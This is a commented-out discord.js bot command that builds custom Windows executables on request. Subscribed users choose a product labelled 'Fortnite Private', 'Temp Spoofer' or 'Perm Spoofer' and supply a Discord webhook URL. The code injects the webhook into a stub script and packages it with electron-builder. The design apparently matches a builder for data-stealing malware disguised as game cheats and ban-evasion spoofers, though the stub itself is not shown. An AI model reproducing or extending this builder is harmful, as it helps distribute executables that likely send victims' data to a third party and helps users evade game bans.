/*

const { SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('build')
    .setDescription('Build a custom executable.')
    .addStringOption(option =>
      option.setName('product')
        .setDescription('The product you want to build for.')
        .setRequired(true)
        .addChoices(
          { name: 'Fortnite Private', value: 'Fortnite Private' },
          { name: 'Temp Spoofer', value: 'Temp Spoofer' },
          { name: 'Perm Spoofer', value: 'Perm Spoofer' }
        )
    )
    .addStringOption(option =>
      option.setName('name')
        .setDescription('The name of your executable.')
        .setRequired(true)
    )
    .addStringOption(option =>
      option.setName('webhook')
        .setDescription('Your Discord webhook URL.')
        .setRequired(true)
    ),

  async execute(interaction) {
    const user = interaction.user;
    const product = interaction.options.getString('product');
    const name = interaction.options.getString('name');
    const webhook = interaction.options.getString('webhook');

    const dataPath = path.join(__dirname, '../data/sub.json');
    const data = JSON.parse(fs.readFileSync(dataPath, 'utf-8'));

    const userHasAccess = data.some(entry => entry.user === user.tag && entry.product === product);

    if (!userHasAccess) {
      return interaction.reply({
        content: `You don't have access to **${product}**.`,
        ephemeral: true,
      });
    }

    const stubPath = path.join(__dirname, '../stub');
    const outputPath = path.join(__dirname, `../output`);

    if (!fs.existsSync(outputPath)) fs.mkdirSync(outputPath, { recursive: true });

    const indexPath = path.join(stubPath, 'index.js');

    try {
      let originalContent = fs.readFileSync(indexPath, 'utf-8');
      let modifiedContent = originalContent.replace(/%webhook%/g, webhook);

      fs.writeFileSync(indexPath, modifiedContent);

      await interaction.reply({
        content: `Starting the build process for **${product}**...`,
        ephemeral: true,
      });

      exec(`npx electron-builder --win --config "${path.join(stubPath, 'package.json').replace(/\\/g, '/')}"`, async (error, stdout, stderr) => {
        fs.writeFileSync(indexPath, originalContent);

        if (error) {
          console.error('Build failed:', stderr || stdout);
          return interaction.followUp({
            content: `The build process failed. Please contact an administrator.`,
            ephemeral: true,
          });
        }

        const embed = new EmbedBuilder()
          .setTitle('Build Completed ✅')
          .setDescription(`Your build for **${product}** is ready!`)
          .setColor('Green')
          .addFields(
            { name: 'Executable Name', value: `${name}.exe` },
            { name: 'Output Directory', value: outputPath }
          )
          .setTimestamp();

        await interaction.followUp({
          embeds: [embed],
          ephemeral: true,
        });
      });
    } catch (error) {
      console.error('Error during build preparation:', error.message);
      return interaction.reply({
        content: `An error occurred while preparing your build. Please contact an administrator.\n\`\`\`${error.message}\`\`\``,
        ephemeral: true,
      });
    }
  },
};
*/
